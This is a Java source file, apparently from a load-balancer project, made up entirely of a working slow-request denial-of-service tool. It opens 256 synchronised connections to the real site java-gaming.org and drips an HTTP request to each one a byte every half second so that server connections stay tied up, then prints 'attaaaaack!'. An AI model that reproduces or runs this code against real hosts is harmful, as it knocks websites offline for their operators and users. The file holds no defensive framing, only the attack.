package net.indiespot.loadbalancer;

import java.io.OutputStream;
import java.net.Socket;
import java.util.concurrent.CountDownLatch;

import net.indiespot.loadbalancer.util.Text;

public class Attack
{
	public static void main(String[] args)
	{
		int count = 256;
		final CountDownLatch latch = new CountDownLatch(count);

		final String host = "java-gaming.org";
		final int port = 80;

		final byte[] payload;
		{
			StringBuilder sb = new StringBuilder();
			sb.append("GET / HTTP/1.0\r\n");
			sb.append("Host: " + host + "\r\n");
			sb.append("Accept: application/json, text/plain, */*\r\n");
			sb.append("Accept-Encoding: gzip,deflate,sdch\r\n");
			sb.append("Accept-Language: en-EN,nl;q=0.8,en-US;q=0.6,en;q=0.4\r\n");
			sb.append("Cache-Control: max-age=0\r\n");
			sb.append("Connection: keep-alive\r\n");
			sb.append("Content-Type: application/json\r\n");
			sb.append("User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36\r\n");
			sb.append("Connection: keep-alive\r\n");
			sb.append("Keep-Alive: true\r\n");
			sb.append("\r\n");
			payload = Text.ascii(sb.toString());
		}

		System.out.println("payload: " + payload.length + " bytes");

		for(int i = 0; i < count; i++)
		{
			new Thread(new Runnable()
			{
				@Override
				public void run()
				{
					try
					{
						latch.countDown();
						latch.await();

						try (Socket s = new Socket(host, port))
						{
							s.setTcpNoDelay(true);
							OutputStream os = s.getOutputStream();

							for(int i = 0; i < payload.length; i++)
							{
								os.write(payload[i]);
								Thread.sleep(500);
							}
						}
					}
					catch (Exception e)
					{
						e.printStackTrace();
					}
				}
			}).start();
		}

		try
		{
			latch.await();
		}
		catch (Exception exc)
		{
			exc.printStackTrace();
		}
		System.out.println("attaaaaack!");
	}
}
